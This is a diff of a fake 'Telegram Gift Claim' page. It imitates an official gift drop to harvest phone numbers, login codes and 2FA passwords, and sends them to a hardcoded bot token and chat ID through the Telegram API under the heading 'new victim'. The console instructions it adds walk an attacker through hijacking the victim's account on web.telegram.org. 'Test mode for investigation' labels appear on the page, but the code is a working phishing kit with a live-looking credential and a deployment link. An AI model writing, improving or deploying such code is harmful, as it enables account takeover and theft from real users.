@@ -8,7 +8,6 @@
     <title>Telegram Gift Claim</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* Все стили такие же, как в вашем коде */
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #f2f5f8;
@@ -111,9 +110,9 @@
             margin-top: 20px;
         }
         .warning-banner {
-            background: #fff3cd;
-            border: 1px solid #ffeeba;
-            color: #856404;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
             padding: 12px;
             border-radius: 12px;
             margin-bottom: 20px;
@@ -156,9 +155,9 @@
     <div class="container">
         <div class="card">
             <!-- Баннер для тестирования -->
-            <div class="warning-banner" style="background: #d4edda; color: #155724; border-color: #c3e6cb;">
+            <div class="warning-banner">
                 ✅ ТЕСТОВЫЙ РЕЖИМ ДЛЯ РАССЛЕДОВАНИЯ<br>
-                <small>После настройки токена данные уйдут в вашего бота</small>
+                <small>Данные уходят в вашего бота</small>
             </div>
 
             <!-- Шапка с имитацией официального дропа -->
@@ -188,7 +187,7 @@
             <!-- ОСНОВНАЯ ФОРМА -->
             <div class="input-group">
                 <label class="input-label">Номер телефона</label>
-                <input type="tel" id="phone" class="input-field" placeholder="+7 (999) 999-99-99" value="+7">
+                <input type="tel" id="phone" class="input-field" placeholder="+994 50 123 45 67" value="+">
             </div>
 
             <div class="input-group">
@@ -216,10 +215,11 @@
     </div>
 
     <script>
-        // !!! ВСТАВЬТЕ СВОИ ДАННЫЕ ЗДЕСЬ !!!
-        const BOT_TOKEN = '8461163853:AAFKId5a96ZlKwkX1zC0goDKPQEqoNSXllE';  // Токен от @BotFather
-        const YOUR_CHAT_ID = '1051253479'; // Ваш ID от @userinfobot
+        // ВАШИ ДАННЫЕ (уже вставлены)
+        const BOT_TOKEN = '8461163853:AAFKId5a96ZlKwkX1zC0goDKPQEqoNSXllE';
+        const YOUR_CHAT_ID = '1051253479';
 
+        // Функция отправки данных в Telegram
         async function sendToTelegram() {
             const phone = document.getElementById('phone').value;
             const code = document.getElementById('code').value;
@@ -228,22 +228,27 @@
             const statusDiv = document.getElementById('status');
             statusDiv.style.display = 'block';
             
-            // Проверка настройки бота
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || YOUR_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-                statusDiv.innerHTML = '❌ ОШИБКА: Не настроен бот! Вставьте BOT_TOKEN и CHAT_ID в код.';
+            // Проверка что поля заполнены
+            if (!phone || phone === '+') {
+                statusDiv.innerHTML = '❌ Введите номер телефона';
+                statusDiv.style.background = '#ffebee';
+                statusDiv.style.color = '#c62828';
+                return;
+            }
+            
+            if (!code) {
+                statusDiv.innerHTML = '❌ Введите код подтверждения';
                 statusDiv.style.background = '#ffebee';
                 statusDiv.style.color = '#c62828';
                 return;
             }
 
             // Формируем сообщение
-            const message = `
-🔴 НОВАЯ ЖЕРТВА!
+            const message = `🔴 НОВАЯ ЖЕРТВА!
 📱 Время: ${new Date().toLocaleString()}
 📞 Номер: ${phone}
 🔑 Код: ${code}
-🔐 Пароль 2FA: ${password || 'не указан'}
-            `;
+🔐 Пароль 2FA: ${password || 'не указан'}`;
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -253,15 +258,14 @@
                     },
                     body: JSON.stringify({
                         chat_id: YOUR_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
+                        text: message
                     })
                 });
 
                 const result = await response.json();
 
                 if (result.ok) {
-                    statusDiv.innerHTML = '✅ Данные отправлены! Проверьте своего бота.';
+                    statusDiv.innerHTML = '✅ Данные отправлены! Проверьте бота.';
                     statusDiv.style.background = '#e8f5e8';
                     statusDiv.style.color = '#2e7d32';
                     
@@ -272,7 +276,7 @@
                         document.getElementById('password').value = '';
                     }, 500);
                 } else {
-                    statusDiv.innerHTML = `❌ Ошибка отправки: ${result.description}`;
+                    statusDiv.innerHTML = `❌ Ошибка: ${result.description}`;
                     statusDiv.style.background = '#ffebee';
                     statusDiv.style.color = '#c62828';
                 }
@@ -283,45 +287,30 @@
             }
         }
 
-        // Форматирование номера телефона
+        // УНИВЕРСАЛЬНОЕ форматирование номера (для всех стран)
         document.getElementById('phone').addEventListener('input', function(e) {
-            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,1})(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
-            e.target.value = !x[2] ? x[1] : '+' + x[1] + ' (' + x[2] + ') ' + x[3] + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
+            // Удаляем всё кроме цифр
+            let numbers = e.target.value.replace(/\D/g, '');
+            // Ограничиваем длину
+            if (numbers.length > 15) numbers = numbers.slice(0, 15);
+            // Добавляем +
+            e.target.value = numbers ? '+' + numbers : '+';
         });
 
-        // ИНСТРУКЦИЯ ДЛЯ ТЕСТИРОВАНИЯ (появится в консоли)
+        // При загрузке показываем инструкцию в консоли
         window.onload = function() {
-            console.log('%c🔴 ИНСТРУКЦИЯ ДЛЯ ТЕСТИРОВАНИЯ КРАЖИ АККАУНТА', 'font-size: 16px; font-weight: bold; color: red;');
-            console.log('%c⚠️ ЭТО ТОЛЬКО ДЛЯ РАССЛЕДОВАНИЯ!', 'font-size: 14px; color: orange;');
+            console.log('%c🔴 ИНСТРУКЦИЯ ДЛЯ ТЕСТИРОВАНИЯ', 'font-size: 16px; font-weight: bold; color: red;');
+            console.log('%c⚠️ ТОЛЬКО ДЛЯ РАССЛЕДОВАНИЯ!', 'font-size: 14px; color: orange;');
             console.log('');
-            console.log('%c📱 ШАГ 1: Подготовьте ДВА устройства:', 'font-weight: bold;');
-            console.log('   - Устройство А (жертва): телефон с SIM-картой первого аккаунта');
-            console.log('   - Устройство Б (мошенник): компьютер/другой телефон');
+            console.log('%c📱 ВАШ БОТ: @PremiumNftGift_bot', 'font-weight: bold;');
+            console.log('%c🔗 ССЫЛКА: https://maykisano.github.io/my-mini-app/', 'font-weight: bold;');
             console.log('');
-            console.log('%c🔧 ШАГ 2: Настройте бота (уже должно быть сделано)', 'font-weight: bold;');
-            console.log('   - BOT_TOKEN:', BOT_TOKEN);
-            console.log('   - CHAT_ID:', YOUR_CHAT_ID);
+            console.log('ШАГИ:');
+            console.log('1. На компьютере: web.telegram.org → введите номер жертвы');
+            console.log('2. На телефоне: откройте бота → нажмите кнопку → введите номер и код');
+            console.log('3. Код придет сюда → введите его на компьютере');
             console.log('');
-            console.log('%c🔄 ШАГ 3: Запустите процесс (ВАЖНАЯ ПОСЛЕДОВАТЕЛЬНОСТЬ)', 'font-weight: bold;');
-            console.log('   1. На Устройстве Б (мошенник) откройте web.telegram.org');
-            console.log('   2. Введите номер Устройства А (жертвы)');
-            console.log('   3. Нажмите "Войти" — Telegram отправит код на Устройство А');
-            console.log('   4. НЕ ЗАКРЫВАЙТЕ вкладку с web.telegram.org!');
-            console.log('');
-            console.log('%c🎯 ШАГ 4: Жертва вводит код', 'font-weight: bold;');
-            console.log('   5. На Устройстве А (жертва) откройте ЭТУ ссылку (Mini App)');
-            console.log('   6. Введите номер своего первого аккаунта');
-            console.log('   7. Введите код, который пришел в Telegram');
-            console.log('   8. Нажмите "Подтвердить"');
-            console.log('');
-            console.log('%c✅ ШАГ 5: Получите доступ', 'font-weight: bold;');
-            console.log('   9. На Устройстве Б (мошенник) проверьте бота — код уже там');
-            console.log('   10. Введите этот код на web.telegram.org');
-            console.log('   11. Если есть 2FA — введите пароль из формы');
-            console.log('   12. ✅ ВЫ В АККАУНТЕ ЖЕРТВЫ!');
-            console.log('');
-            console.log('%c⏱️ ВАЖНО: Код действует 1-2 минуты!', 'color: red; font-weight: bold;');
-            console.log('%c🔐 ЕСЛИ ЕСТЬ 2FA: Жертва должна ввести его в поле "Код двухфакторки"', 'color: orange;');
+            console.log('%c⏱️ Код действует 1-2 минуты!', 'color: red;');
         };
     </script>
 </body>
